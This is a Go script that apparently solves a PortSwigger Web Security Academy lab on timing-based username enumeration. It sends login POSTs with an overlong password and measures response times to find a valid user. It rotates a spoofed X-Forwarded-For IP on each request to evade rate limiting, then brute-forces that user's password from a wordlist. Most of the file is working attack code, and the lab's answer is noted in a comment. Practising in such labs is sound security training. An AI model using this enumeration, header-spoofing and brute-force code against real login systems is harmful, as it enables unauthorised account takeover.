package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

const (
	// this will change base on the current lab
	LoginURL     = "https://acc61fc71f97c4a4c07f0fa400160092.web-security-academy.net/login"
	longPassword = `ghhhhnasmnmsansanasknlsaknlamslmsakljafnlknflnf;
	                sanklasfjbfjsanknklsniwqygiwqbjnknknownonknSK;MAMMKOK
					HJbmnmdkmlmlam;;llqwyiuewqrnfkwengf'lK;LM,SMAktuWHEOPWQJPMLMSA'skPSK
					QSNEWHFJENG'FML;SMweiqwrhownf;'pojSOPQJONSQKLAL;samf'LPMP{JWfnPL'W}
					NWQJFSQFNOKNS;POJSOQ	EIQUIRWNKKOal;mA'SPKSP[ksoiayuwifnkasncl,asmvnkcbask]
					`
)

var (
	UserNames = []string{}
	Passwords = []string{}
)

func LogFatal(err error) {
	if err != nil {
		log.Fatal(err)
	}
}
func readData(name string) []string {
	file, err := os.Open(name)
	LogFatal(err)
	defer file.Close()
	scanner := bufio.NewScanner(file)
	var data []string
	for scanner.Scan() {
		l := scanner.Text()
		if l != "" {
			data = append(data, l)
		}
	}
	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	return data
}
func TimedPost(user, pass, sourceIP string) string {

	//var start time.Time
	//trace := &httptrace.ClientTrace{
	// DNSStart: func(dsi httptrace.DNSStartInfo) { dns = time.Now() },
	// DNSDone: func(ddi httptrace.DNSDoneInfo) {
	// 	//fmt.Printf("DNS Done: %v\n", time.Since(dns))
	// },

	// TLSHandshakeStart: func() { tlsHandshake = time.Now() },
	// TLSHandshakeDone: func(cs tls.ConnectionState, err error) {
	// 	//fmt.Printf("TLS Handshake: %v\n", time.Since(tlsHandshake))
	// },

	// ConnectStart: func(network, addr string) { connect = time.Now() },
	// ConnectDone: func(network, addr string, err error) {
	// 	//fmt.Printf("Connect time: %v\n", time.Since(connect))
	// },

	//GotFirstResponseByte: func() {
	//	fmt.Printf("First Byte Time: %v\n", time.Since(start))
	//},
	//	}

	//url := LoginURL + "?username=" + user + "&password=" + pass
	data := url.Values{}
	data.Set("username", user)
	data.Set("password", pass)
	req, err := http.NewRequest("POST", LoginURL, strings.NewReader(data.Encode()))
	LogFatal(err)
	//req = req.WithContext(httptrace.WithClientTrace(req.Context(), trace))
	start := time.Now()
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("X-Forwarded-For", sourceIP)
	client := http.Client{}
	//res, err := http.DefaultTransport.RoundTrip(req)
	res, err := client.Do(req)
	LogFatal(err)
	fmt.Printf("Total time: %v\n", time.Since(start))
	defer res.Body.Close()
	bd, err := ioutil.ReadAll(res.Body)
	LogFatal(err)
	return string(bd)

}
func EnumerateUsername() {
	ip := 1
	for _, v := range UserNames {
		fmt.Println("Testing Username: " + v)
		d := TimedPost(v, longPassword, fmt.Sprintf("11.12.13.%d", ip))
		ip++
		fmt.Println(d)
	}
}

func EnumeratePassword(user string) string {
	ip := 1
	for _, v := range Passwords {
		fmt.Println("Testing Password: " + v)
		d := TimedPost(user, v, fmt.Sprintf("12.12.13.%d", ip))
		ip++
		if !strings.Contains(d, "Invalid username or password.") {
			return v
		}
	}
	return ""
}

/*
 - Firstly run only func EnumerateUsername and store the output in a file
 - Observe the content of file, see where Total time is relatively highest for all users
 - Pick that user and enumerate through all the passwords
*/

func main() {
	// read usernames
	UserNames = readData("users.txt")
	// read passwords
	Passwords = readData("passwords.txt")
	// enumerate username
	EnumerateUsername()
	// "asterix" is solution for my lab
	password := EnumeratePassword("asterix")
	fmt.Println("Password found: " + password)
}
